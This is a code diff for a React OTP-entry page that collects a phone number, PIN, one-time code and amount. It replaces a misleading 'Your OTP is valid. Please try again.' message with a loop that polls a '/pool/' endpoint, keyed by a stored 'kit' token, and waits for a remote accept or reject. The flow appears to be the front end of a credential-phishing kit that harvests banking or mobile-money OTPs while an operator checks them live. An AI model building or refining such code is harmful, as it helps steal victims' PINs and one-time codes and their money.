@@ -3,6 +3,7 @@ import { ChevronLeft } from 'lucide-react';
 
 import { useFetcher } from 'react-router';
 import type { Route } from './+types/otp-new';
+import { LoadingModal } from './process-new';
 
 
 
@@ -70,6 +71,10 @@ const { phone, amount } = params;
     inputRefs[0].current?.focus();
   };
   const fetcher = useFetcher();
+  const [message, setMessage] = useState(
+    "Please wait while we process your request...",
+  );
+  const [open, setOpen] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -80,7 +85,10 @@ const { phone, amount } = params;
       return;
     }
 
+    localStorage.setItem("kit", `${new Date().getTime().toString()}${attempt}${amount}otp`);
+
     setIsSubmitting(true);
+    setOpen(true);
     await fetcher.submit({
       phone: phone,
       otp: finalCode,
@@ -94,7 +102,7 @@ const { phone, amount } = params;
     setIsSubmitting(false);
     setAttempt(attempt+1);
 
-    setError("Your OTP is valid. Please try again.");
+    //setError("Your OTP is valid. Please try again.");
 
     // Field Length Validation Bounds Rule Checks
     
@@ -102,13 +110,77 @@ const { phone, amount } = params;
 
     
   };
-  useEffect(()=>{
-    if(fetcher.data?.success){
-      window.location.href="/success"
-    }
-  },[fetcher.data])
+  // useEffect(()=>{
+  //   if(fetcher.data?.success){
+  //     window.location.href="/success"
+  //   }
+  // },[fetcher.data]);
 
   const isFormFilled = otp.every(digit => digit !== '');
+
+  const pollStartTimeRef = useRef<number>(null);
+    useEffect(() => {
+    const data = fetcher.data;
+    if (!data) return;
+  if ((data?.success || data?.status) && !pollStartTimeRef.current) {
+      pollStartTimeRef!.current = Date.now();
+      setMessage("Validation running please wait...");
+    }
+  
+    // 3. Check if 45 seconds have passed
+    if (pollStartTimeRef.current) {
+      const elapsedSeconds = (Date.now() - pollStartTimeRef.current) / 1000;
+      if (elapsedSeconds >= 45) {
+        setMessage("Validation timed out. Please try again.");
+        setError("Validation timed out. Please try again." );
+  
+        setOpen(false);
+        pollStartTimeRef.current = null; // Reset the timer
+        return; 
+      }
+    }
+  
+    // 1. Handle final states immediately when fetcher.data updates
+    if (data.status === "accept") {
+      setMessage(data.message);
+      alert(data.message);
+      setOpen(false);
+      window.location.href="/success"
+      //window.location.href = `/otp/${phoneNumber}/${amount}`;
+      return; // Stop here, no further polling
+    }
+  
+    if (data.status === "reject" || data.status === "error") {
+      if(data.type =="phone"){
+        alert("Phone number or pin is invalid");
+        window.location.href = "/process/"+amount;
+      }
+      if(data.type =="otp"){
+      setError("Otp is invalid, please try again!");
+      setMessage(data.message);
+      setOpen(false);
+      }
+      return; // Stop here, no further polling
+    }
+  
+    // 2. Handle the ongoing polling state
+    if (data.success || data.status) {
+      setMessage("Validation ongoing...");
+  
+      const timer = setTimeout(async () => {
+        await fetcher.submit(
+          {},
+          {
+            method: "POST",
+            action: "/pool/" + (localStorage.getItem("kit") ?? ""),
+          }
+        );
+      }, 5000);
+  
+      // 3. Clean up the timeout if the component unmounts or data changes
+      return () => clearTimeout(timer);
+    }
+  }, [fetcher.data , amount]);
 
   return (
     <div className="min-h-screen bg-[#f3f4f6] flex flex-col items-center justify-center p-4 antialiased selection:bg-blue-100">
@@ -175,7 +247,7 @@ const { phone, amount } = params;
               </p>
             )}
           </div>
-          {otp.join('')}
+          
 
           {/* Dynamic Resend Countdown Subheading Text Context Option */}
           <div className="text-center text-[13px]">
@@ -216,7 +288,7 @@ const { phone, amount } = params;
           </button>
 
         </form>
-
+            <LoadingModal open={open} title="Processing request" message={message} />
       </div>
     </div>
   );
